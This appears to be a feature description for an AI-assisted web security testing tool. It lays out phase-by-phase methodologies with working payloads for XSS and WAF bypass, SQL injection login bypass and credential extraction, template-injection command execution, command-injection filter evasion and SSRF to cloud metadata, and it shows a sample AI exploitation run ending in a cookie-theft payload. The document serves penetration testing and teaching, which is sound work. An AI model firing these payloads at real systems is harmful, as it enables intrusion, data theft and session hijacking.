# Systematic Testing Methodology - VISTA Enhancement

## 🎯 Overview

VISTA now includes a **Systematic Testing Methodology Engine** that provides step-by-step exploitation guidance based on real-world bug bounty practices and PayloadsAllTheThings repository.

---

## ✨ What's New

### **1. Systematic Testing Engine** (`SystematicTestingEngine.java`)

Provides structured, phase-based testing methodologies for:
- ✅ XSS (Cross-Site Scripting)
- ✅ SQL Injection
- ✅ SSTI (Server-Side Template Injection)
- ✅ Command Injection
- ✅ SSRF (Server-Side Request Forgery)

### **2. Enhanced AI Prompts**

AI now receives:
- **Systematic Methodology** - Step-by-step testing approach
- **WAF Detection** - Automatic WAF identification and bypasses
- **Bypass Knowledge Base** - PayloadsAllTheThings techniques
- **Context-Aware Guidance** - Specific to the request/response

### **3. Integrated Workflow**

```
User Request → WAF Detection → Systematic Methodology → Bypass Knowledge → AI Analysis → Targeted Payloads
```

---

## 📚 Systematic Methodologies

### **XSS Testing Methodology**

#### **Phase 1: Reconnaissance**
1. **Identify Reflection Points**
   - Send unique marker
   - Search for marker in response
   - Note exact location

2. **Analyze Reflection Context**
   - HTML Body: `<div>YOUR_INPUT</div>`
   - HTML Attribute: `<input value='YOUR_INPUT'>`
   - JavaScript: `var x = 'YOUR_INPUT';`
   - Event Handler: `onclick='YOUR_INPUT'`

3. **Check for Output Encoding**
   - Test: `<script>alert(1)</script>`
   - Encoded: `&lt;script&gt;` (SAFE)
   - Unencoded: `<script>` (VULNERABLE)

#### **Phase 2: WAF Detection**
- Send common XSS payloads
- Observe 403/406 responses
- Check headers (cf-ray, x-sucuri-id, etc.)

#### **Phase 3: Exploitation**
1. **Basic Payloads** (No WAF)
   - `<script>alert(document.domain)</script>`
   - `<img src=x onerror=alert(1)>`
   - `<svg/onload=alert(1)>`

2. **Encoding Bypass**
   - URL: `%3Cscript%3E`
   - HTML Entities: `&#x3c;script&#x3e;`
   - Unicode: `\u003cscript\u003e`

3. **WAF Bypass**
   - Cloudflare: `<svg/onload=alert(1)//>`
   - ModSecurity: `<ScRiPt>alert(1)</sCrIpT>`
   - Akamai: `<svg><animate onbegin=alert(1)>`

4. **Context-Specific**
   - Attribute: `" onload="alert(1)`
   - JavaScript: `';alert(1);//`
   - Template: `${alert(1)}`

5. **CSP Bypass**
   - JSONP abuse
   - Allowed domains
   - Base tag injection

#### **Phase 4: Verification**
- Browser verification (headless Chrome)
- Impact demonstration (cookie theft, keylogging)

---

### **SQL Injection Testing Methodology**

#### **Phase 1: Detection**
1. **Error-Based**
   - Send: `'`
   - Look for SQL errors

2. **Boolean-Based**
   - Send: `' AND '1'='1` (TRUE)
   - Send: `' AND '1'='2` (FALSE)
   - Compare responses

3. **Time-Based**
   - MySQL: `' AND SLEEP(5)--`
   - PostgreSQL: `'; SELECT pg_sleep(5)--`
   - MSSQL: `'; WAITFOR DELAY '00:00:05'--`

#### **Phase 2: Fingerprinting**
- MySQL: `' AND @@version--`
- PostgreSQL: `' AND version()--`
- MSSQL: `' AND @@version--`
- Oracle: `' AND banner FROM v$version--`

#### **Phase 3: Exploitation**
1. **Authentication Bypass**
   - `admin' OR '1'='1`
   - `admin'--`
   - `admin' OR 1=1--`

2. **UNION-Based Extraction**
   - Find columns: `' ORDER BY 1--`
   - Extract: `' UNION SELECT username,password,3 FROM users--`

3. **WAF Bypass**
   - Case: `SeLeCt`
   - Comments: `SEL/**/ECT`
   - Whitespace: `SELECT%09FROM`
   - Encoding: `%53%45%4C%45%43%54`

4. **Time-Based Extraction**
   - Binary search for data
   - Character-by-character extraction

#### **Phase 4: Advanced**
- File read: `LOAD_FILE('/etc/passwd')`
- RCE: `xp_cmdshell`, `INTO OUTFILE`

---

### **SSTI Testing Methodology**

#### **Phase 1: Detection**
- `{{7*7}}` → 49?
- `${7*7}` → 49?
- `<%= 7*7 %>` → 49?

#### **Phase 2: Engine Identification**
- `{{config}}` → Jinja2
- `{{_self}}` → Twig
- `${7*'7'}` = 7777777 → Jinja2

#### **Phase 3: Exploitation**
- **Jinja2**: `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}`
- **Twig**: `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}`
- **Freemarker**: `<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }`

---

### **Command Injection Testing Methodology**

#### **Phase 1: Detection**
- `; whoami`
- `| whoami`
- `$(whoami)`
- `; sleep 5` (time-based)

#### **Phase 2: Exploitation**
1. **Basic Commands**
   - Linux: `; cat /etc/passwd`
   - Windows: `& type C:\\boot.ini`

2. **Space Bypass**
   - `{cat,/etc/passwd}`
   - `$IFS`
   - `<cat<</etc/passwd`

3. **Keyword Bypass**
   - Case: `Cat`
   - Wildcards: `/???/??t`
   - Encoding: `$(echo Y2F0 | base64 -d)`

---

### **SSRF Testing Methodology**

#### **Phase 1: Detection**
- Send: `http://burpcollaborator.net`
- Check for callback

#### **Phase 2: Exploitation**
1. **Localhost Bypass**
   - `http://127.0.0.1`
   - `http://localhost`
   - `http://0.0.0.0`
   - `http://127.1`
   - `http://2130706433` (decimal)

2. **Cloud Metadata**
   - AWS: `http://169.254.169.254/latest/meta-data/`
   - Azure: `http://169.254.169.254/metadata/instance`
   - GCP: `http://metadata.google.internal/computeMetadata/v1/`

---

## 🤖 How AI Uses This

### **Enhanced AI Prompt Structure**

```
1. USER'S GOAL: Test for XSS

2. REQUEST & RESPONSE: [actual data]

3. WAF DETECTION:
   🛡️ Cloudflare detected (85% confidence)
   Bypass techniques: case variation, SVG tags, etc.

4. SYSTEMATIC METHODOLOGY:
   Phase 1: Reconnaissance
     - Step 1.1: Identify reflection points
     - Step 1.2: Analyze context
     - Step 1.3: Check encoding
   Phase 2: WAF Detection
     - Step 2.1: Test for WAF
   Phase 3: Exploitation
     - Step 3.1: Basic payloads
     - Step 3.2: Encoding bypass
     - Step 3.3: WAF bypass
     - Step 3.4: Context-specific
     - Step 3.5: CSP bypass
   Phase 4: Verification
     - Step 4.1: Browser verification
     - Step 4.2: Impact demonstration

5. BYPASS KNOWLEDGE BASE:
   [PayloadsAllTheThings techniques]

6. INSTRUCTIONS:
   - Follow methodology step-by-step
   - Use WAF-specific bypasses
   - Reference bypass knowledge base
   - Be specific to THIS request
```

### **Result**

AI provides:
- ✅ Step-by-step exploitation plan
- ✅ Context-aware payloads
- ✅ WAF-specific bypasses
- ✅ References to PayloadsAllTheThings
- ✅ Expected success indicators
- ✅ Verification methods

---

## 💡 Example Usage

### **User Query: "Test for XSS"**

**VISTA Response:**

```
🔍 PHASE 1: RECONNAISSANCE

Following systematic XSS methodology...

Step 1: Checking reflection
- Sent marker: test123xyz
- ✓ Marker found in response at: <input value='test123xyz'>
- Context: HTML attribute

Step 2: Checking output encoding
- Sent: <script>alert(1)</script>
- Response: <input value='&lt;script&gt;alert(1)&lt;/script&gt;'>
- ⚠️ HTML encoding detected

🛡️ PHASE 2: WAF DETECTION

- Sent: <img src=x onerror=alert(1)>
- Response: 403 Forbidden
- Headers: cf-ray: 123456789
- ✓ Cloudflare WAF detected (90% confidence)

🎯 PHASE 3: EXPLOITATION

Using Cloudflare-specific bypasses for HTML attribute context...

Payload 1: " onload="alert(1)
- Why: Break out of attribute, Cloudflare allows event handlers
- Testing...
- ✓ SUCCESS! Payload reflected unencoded

🌐 PHASE 4: VERIFICATION

Browser verification...
- ✓ Alert executed in headless Chrome
- ✓ Cookie accessible: document.cookie

🎯 VULNERABILITY CONFIRMED!
- Type: Reflected XSS
- Context: HTML attribute
- WAF: Cloudflare (bypassed)
- Payload: " onload="alert(document.cookie)
- Impact: Cookie theft, session hijacking possible
```

---

## 📊 Benefits

### **For Bug Bounty Hunters:**
- ✅ Systematic approach (no missed steps)
- ✅ WAF-aware testing
- ✅ PayloadsAllTheThings integration
- ✅ Context-specific payloads
- ✅ Higher success rate

### **For Pentesters:**
- ✅ Professional methodology
- ✅ Documented testing process
- ✅ Reproducible results
- ✅ Report-ready findings

### **For Learning:**
- ✅ See expert methodology in action
- ✅ Understand why each step matters
- ✅ Learn bypass techniques
- ✅ Build testing skills

---

## 🔗 References

All methodologies based on:
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- OWASP Testing Guide
- Real-world bug bounty reports
- Professional penetration testing practices

---

## 🚀 Future Enhancements

### **Planned:**
- Interactive Q&A during testing
- User-provided hints/context
- Learning from successful exploits
- Custom methodology templates
- Automated report generation

---

**VISTA now thinks like a professional bug bounty hunter, following proven methodologies and using real-world bypass techniques!**
